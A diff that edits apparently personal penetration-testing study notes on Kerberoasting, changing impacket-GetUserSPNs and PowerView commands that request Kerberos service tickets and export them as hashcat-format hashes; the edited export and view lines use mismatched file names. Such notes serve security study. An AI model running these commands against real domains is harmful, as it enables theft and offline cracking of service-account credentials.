@@ -31,7 +31,7 @@ Several tools can be utilized to perform the attack:
 
 ## Performing the Attack
 >A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.
-### Kerberoasting with GetUserSPNs.py
+### Kerberoasting with GetUserSPNs.py From Linux
 we need : **domain controller ip** + **authenticate to the Domain Controller** (a ==cleartext password, NT password hash, or even a Kerberos ticket(echo $KRB5CCNAME)==)
 ```bash
 # tool location 
@@ -39,7 +39,7 @@ we need : **domain controller ip** + **authenticate to the Domain Controller** (
 impacket-GetUserSPNs -h 
 
 # Listing SPN Accounts with GetUserSPNs.py
-impacket-GetUserSPNs -dc-ip <DC-IP> <DOMAIN.LOCAL>/<USER>
+impacket-GetUserSPNs -dc-ip <DC-IP> <DOMAIN.LOCAL>/<USER>:<PASS>
 
 # Requesting all TGS Tickets
 GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN.LOCAL>/<USER> -request
@@ -114,9 +114,9 @@ Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat | Sele
   # -ExpandProperty it will write all the output line
 
 # Exporting All Tickets to a CSV File
-Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
 
-cat .\ilfreight_tgs.csv # Viewing the Contents of the .CSV File
+cat .\ilfreight_spn.csv # Viewing the Contents of the .CSV File
 ```
 #### Using Rubeus
 ```powershell
